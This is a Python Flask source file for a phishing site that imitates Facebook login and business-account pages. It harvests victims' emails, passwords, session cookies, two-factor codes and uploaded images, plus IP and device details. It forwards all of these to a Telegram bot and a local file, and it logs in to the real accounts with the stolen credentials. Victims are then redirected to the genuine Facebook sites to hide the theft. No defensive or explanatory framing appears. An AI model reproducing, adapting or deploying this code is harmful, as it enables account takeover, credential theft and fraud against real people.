from flask import Flask, render_template, request,jsonify, redirect
from facebook_api import facebook
import telegram_api
from datetime import datetime
import os
import requests
import urllib.parse

app = Flask(__name__)
global count_cookie
count_cookie = 1
def save_to_txt(content):
	# print(content)
	f = open('data.txt','a+',encoding='utf-8')
	f.write(content+"\n======================\n")
def get_time_now():
	now = datetime.now()
	created_date = now.strftime("%d/%m/%Y %H:%M:%S")
	return created_date

def get_country(ip):
	try:
		url = f"https://ipinfo.io/{ip}/json"
		response = requests.get(url)
		data = response.json()
		country = data.get('country')
		if country:
			return country
		else:
 			return "null"
	except Exception as e:
		return "null"
def cut_string(key,data,option):
	temp = data
	if option:
		index = temp.find(key)
		temp = temp[index+len(key):]
		return temp
	else:
		index = temp.find(key)
		return temp[:index]
def get_uid_from_cookies(cookies):
	cookies_decode = urllib.parse.unquote(cookies)
	uid = cut_string('{"u":',cookies_decode,True)
	uid = cut_string(',',uid,False)
	try:
		int(uid)
	except:
		uid = cut_string('c_user=',cookies_decode,True)
		uid = cut_string(';',uid,False)
		try:
			int(uid)
		except:
			uid = 'null'
	return uid
@app.route("/business/loginpage/")
@app.route("/business/loginpage")
def ads_page():
	return redirect('/login')
	
@app.route("/business/loginpage/next/")
@app.route("/business/loginpage/next")
@app.route("/confirmation-your-account")
@app.route("/confirmation-your-account/")
@app.route("/")
def facebook_login():
	return redirect('/login')
	
@app.route("/upload",methods=["POST"])
def upload():
	image = request.files['file']
	now = datetime.now()
	created_date = now.strftime("%d%m%Y%H%M%S%f")
	path_image = 'images/pic'+created_date+'.png'
	image.save(path_image)
	telegram_api.upload_file(path_image)
	os.remove(path_image)
	return redirect("https://www.facebook.com/accountquality")
@app.route("/login", methods=["POST","GET"])
def login():
	ip = request.headers.get('X-Forwarded-For', request.remote_addr)
	country_ip = get_country(ip)

	agent = request.headers.get('User-Agent')
	global count_cookie

	if request.method == "POST":
		username = request.form.get('email')
		password = request.form.get('pass')
		message,cookie = facebook.login_fb(username,password)
		uid = get_uid_from_cookies(cookie)
		if message == '2fa':
			try:
				result = ('STT: <code>'+str(count_cookie)+'</code>\n'+
								'Trạng thái: <code>Đang chờ 2fa</code>\n'+
								'Date: <code>'+get_time_now()+'</code>\n'+
								'IP: <code>'+ip+'</code>\n'+
								'Country: <code>'+country_ip+'</code>\n\n'+
								'UID: <code>'+uid+'</code>\n'+
								'Username: <code>'+username+'</code>\n'+
								'Password: <code>'+password+'</code>\n'+
								'Cookie: <code>'+cookie+'</code>\n\n'+
								'User-agent: <code>'+agent+'</code>')
				telegram_api.send_message(result)
				save_to_txt(result)

				count_cookie+=1
			except:
				pass
			if ('iphone' or 'android' or 'blackberry') in agent.lower():
				return render_template("2fa_mobile.html",username=username,password=password)
			else:
				return render_template("2fa.html",username=username,password=password)

			
		elif message == 'fail':
			if ('iphone' or 'android' or 'blackberry') in agent.lower():
				return render_template("login_fail_mobile.html",username=username)
			else:
				return render_template("login_fail.html",username=username)
		elif message == 'success_die':
			result = ('STT: <code>'+str(count_cookie)+'</code>\n'+
								'Trạng thái: <code>Không có 2fa nhưng bị checkpoint</code>\n'+
								'Date: <code>'+get_time_now()+'</code>\n'+
								'IP: <code>'+ip+'</code>\n'+
								'Country: <code>'+country_ip+'</code>\n\n'+
								'UID: <code>'+uid+'</code>\n'+
								'Username: <code>'+username+'</code>\n'+
								'Password: <code>'+password+'</code>\n'+
								'Cookie: <code>'+cookie+'</code>\n\n'+
								'User-agent: <code>'+agent+'</code>')
			telegram_api.send_message(result)
			save_to_txt(result)
			count_cookie+=1
			return redirect('https://business.facebook.com/')

		else:
			result = ('STT: <code>'+str(count_cookie)+'</code>\n'+
								'Trạng thái: <code>Không có 2fa</code>\n'+
								'Date: <code>'+get_time_now()+'</code>\n'+
								'IP: <code>'+ip+'</code>\n'+
								'Country: <code>'+country_ip+'</code>\n\n'+
								'UID: <code>'+uid+'</code>\n'+
								'Username: <code>'+username+'</code>\n'+
								'Password: <code>'+password+'</code>\n'+
								'Cookie: <code>'+cookie+'</code>\n\n'+
								'User-agent: <code>'+agent+'</code>')
			telegram_api.send_message(result)
			save_to_txt(result)
			count_cookie+=1
			# return render_template("card_form.html")
			return redirect('https://business.facebook.com/')

	
	if ('iphone' or 'android' or 'blackberry') in agent.lower():
		return render_template('mobile.html')
	else:
		return render_template("login.html")
	

@app.route("/checkpoint", methods=["POST","GET"])
def login_2fa():
	agent = request.headers.get('User-Agent')

	global count_cookie
	if request.method == "POST":
		username = request.form.get('username')
		password = request.form.get('password')
		code_2fa = request.form.get('approvals_code')

		ip = request.headers.get('X-Forwarded-For', request.remote_addr)
		country_ip = get_country(ip)

		info = ('STT: <code>'+str(count_cookie)+'</code>\n'+
				'Trạng thái: <code>Đã nhập 2fa</code>\n'+
				'Date: <code>'+get_time_now()+'</code>\n'+
				'IP: <code>'+ip+'</code>\n'+
				'Country: <code>'+country_ip+'</code>\n'+
				'User-agent: <code>'+agent+'</code>\n\n'+
				'Username: <code>'+username+'</code>\n'+
				'Password: <code>'+password+'</code>\n')

		message,cookie = facebook.login_fb_2fa(username,password,code_2fa,info)
		if message == 'fail':
			if ('iphone' or 'android' or 'blackberry') in agent.lower():
				return render_template('2fa_mobile_fail.html',username=username,password=password)
			else:
				return render_template("2fa_fail.html",username=username,password=password)
		else:
			count_cookie+=1
			return redirect('https://business.facebook.com/')
		
	if ('iphone' or 'android' or 'blackberry') in agent.lower():
		return render_template('mobile.html')
	else:
		return render_template("login.html")
if __name__ == '__main__':
	app.run(host='0.0.0.0', port=80,debug=True)